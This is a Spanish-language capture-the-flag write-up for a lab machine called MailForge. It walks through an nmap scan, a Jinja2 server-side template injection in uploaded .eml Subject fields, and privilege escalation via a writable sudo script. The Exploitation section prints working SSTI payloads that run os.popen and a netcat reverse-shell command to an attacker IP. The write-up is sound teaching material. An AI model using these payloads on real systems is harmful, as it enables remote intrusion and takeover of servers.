# Reconocimiento
Iniciamos el proceso con un escaneo exhaustivo de puertos utilizando `nmap` para identificar los servicios activos en el sistema objetivo:
```bash
nmap -p- --open -sSCV --min-rate 5000 -n -Pn -vvv [IP] -oN puertos.txt
```
```bash
PORT     STATE SERVICE REASON         VERSION                                                                                                                                                                     
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 10.2 (protocol 2.0)                                                                                                                                                 
80/tcp   open  http    syn-ack ttl 64 nginx                                                                                                                                                                       
| http-methods:                                                                                                                                                                                                   
|_  Supported Methods: GET HEAD POST OPTIONS                                                                                                                                                                      
|_http-title: Did not follow redirect to http://mailforge.nyx/                                                                                                                                                    
5000/tcp open  http    syn-ack ttl 64 Werkzeug httpd 3.1.4 (Python 3.12.12)                                                                                                                                       
| http-methods:                                                                                                                                                                                                   
|_  Supported Methods: OPTIONS GET HEAD                                                                                                                                                                           
|_http-title: MailForge - Email Preview Service                                                                                                                                                                   
|_http-server-header: Werkzeug/3.1.4 Python/3.12.12
```
A帽adimos el dominio http://mailforge.nyx/ al `/etc/hosts` de nuestra maquina

Al explorar el puerto 80, encontramos un mensaje simple: "MailForge says: Hello". Sin embargo, en el puerto 5000, descubrimos una aplicaci贸n denominada "MailForge - Email Preview Service".

En el puerto 5000 encontramos lo siguiente

![puerto5000](../img/1/puerto5000.png)

La funcionalidad principal permite a los usuarios subir archivos con extensi贸n `.eml` para previsualizar su contenido.

Creamos un archivo de prueba `test.eml`
```eml
From: alherrero@gmail.com
To: test@gmail.com
Subject: test
Date: Sun, 10 Jan 2026 10:43:44 +0200

Hello world!
```

Al cargarlo, observamos que los campos Subject, From y To se renderizan directamente en la p谩gina.

![subidaEML](../img/1/subidaEML.png)

# Explotaci贸n

Tras realizar diversas pruebas con diferentes payloads en los campos del archivo `.eml`, confirmamos una vulnerabilidad de SSTI (Server-Side Template Injection) en el campo Subject.
```eml
From: alherrero@gmail.com
To: test@gmail.com
Subject: {{7*7}}
Date: Sun, 10 Jan 2026 10:43:44 +0200

Hello world!
```
El resultado renderizado fue 49, confirmando que el motor de plantillas (Jinja2, dado el entorno Werkzeug/Python) est谩 ejecutando c贸digo.

![ssti1](../img/1/ssti1.png)

Para escalar de SSTI a RCE, utilizamos el siguiente payload dise帽ado para acceder al m贸dulo os y ejecutar comandos del sistema:
```java
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('whoami').read() }}
```

![rcessti1](../img/1/rcessti1.png)

Confirmada la ejecuci贸n, procedemos a enviarnos una Reverse Shell:

```java
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('nc 192.168.1.194 9001 -e sh').read() }}
```

![rcessti2](../img/1/rcessti2.png)

# Escala de privilegios

Una vez dentro del sistema como el usuario `mailforge`, revisamos si podemos ejecutar alg煤n comando como root con `sudo -l`.

![sudol](../img/1/sudol.png)

Identificamos que el usuario actual puede ejecutar como root el script `/usr/local/bin/cleaner.sh` sin necesidad de contrase帽a.

Podemos ejecutar como root el script `/usr/local/bin/cleaner.sh`

Al revisar los permisos del archivo, detectamos que tenemos permisos de escritura sobre el mismo. Esto nos permite inyectar c贸digo malicioso directamente en un binario que ser谩 ejecutado con privilegios elevados.

Modificamos el contenido del script para que nos devuelva una shell de root:

![rootrevshell](../img/1/rootrevshell.png)

Finalmente, ejecutamos el script con sudo:

```bash
sudo /usr/local/bin/cleaner.sh
```

![rootshell](../img/1/root.png)

Ya somos root! 
